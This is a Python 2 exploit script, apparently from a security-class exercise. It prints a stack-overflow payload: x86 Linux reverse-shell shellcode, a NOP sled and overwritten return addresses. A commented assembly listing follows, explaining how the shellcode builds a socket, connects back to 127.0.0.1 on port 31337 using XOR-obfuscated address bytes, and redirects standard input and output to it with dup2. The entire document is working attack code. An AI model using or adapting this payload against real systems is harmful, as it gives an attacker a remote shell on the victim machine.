from shellcode import shellcode
from struct import pack

def main():
	print "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\xb9\x7f\x01\x01\x01\x81\xf1\x7f\x10\x10\x10\x81\xf1\x7f\x11\x11\x10\x51\x66\x68\x7a\x69\x43\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9" + shellcode + "\x90"*1957 + pack("<I", 0xbffe8c38) + pack("<I", 0xbffe944c)

if __name__ == '__main__':
	main()


'''
.global main
main:
	;
	; int socketcall(int call, unsigned long *args);
	; eax = 0x66, ebx = sys_socket (0x01), ecx = *args
	;
	push	$0x66
	pop		%eax				; eax = 0x66

	push	$0x1
	pop		%ebx				; ebx = 0x01

	;
	; sockfd = socket(int socket_family, int socket_type, int 
	;				  protocol);
	; socket_family = AF_INET (0x02), socket_type = SOCK_STREAM (0x01),
	; protocol = IPPROTO_IP (0x00)
	;
	xor		%edx, %edx
	push	%edx				; protocol = IPPROTO_IP (0x00)
	push	%ebx				; socket_type = SOCK_STREAM (0x01)
	push	$0x2				; socket_family = AF_INET (0x02)
	mov		%esp, %ecx			; ecx = *args

	int		$0x80				; call sys_socket
	xchg	%eax, %edx			; save sockfd



	;
	; int socketcall(int call, unsigned long *args);
	; eax = 0x66, ebx = sys_connect (0x03), ecx = *args
	;
	mov		$0x66, %al			; eax = 0x66

	; struct sockaddr_in {
	;   short          sin_family;  // Address family
	;   unsigned short sin_port;    // Port number
	;   struct in_addr sin_addr;    // Internet address
	;   char           sin_zero[8]; // Padding
	;};
	mov 	$0x0101017f, %ecx	; ecx = 0x0101017f
	xor		$0x1010107f, %ecx	; ecx = 0x11111100
	xor		$0x1011117f, %ecx	; ecx = 0x0100007f
	push	%ecx				; sin_addr = 127.0.0.1

	pushw	$0x697a				; sin_port = 31337
	inc		%ebx
	pushw	$0x2				; sin_family = AF_INET (0x02)
	mov		%esp, %ecx			; ecx = *sockaddr_in

	;
	; int connect(int sockfd, const struct sockaddr* addr,
	;		  	  socklen_t addrlen);
	;
	push	$0x10				; addrlen = 16 bytes
	push	%ecx				; pointer to sockaddr_in
	push	%edx				; sockfd

	mov		%esp, %ecx			; ecx = *args
	inc		%ebx				; ebx = sys_connect (0x03)

	int		$0x80				; call sys_connect



	;
	; int dup2(int oldfd, int newfd)
	; eax = 0x3f, ebx = sockfd,
	; ecx = stdin(0) && stdout(1) && suderr(2)
	;
	push	$0x2
	pop		%ecx				; ecx = 0x02
	xchg	%ebx, %edx			; ebx = sockfd
loop:
	mov		$0x3f, %al			; eax = 0x3f
	int		$0x80				; call dup2
	dec		%ecx
	jns		loop
'''
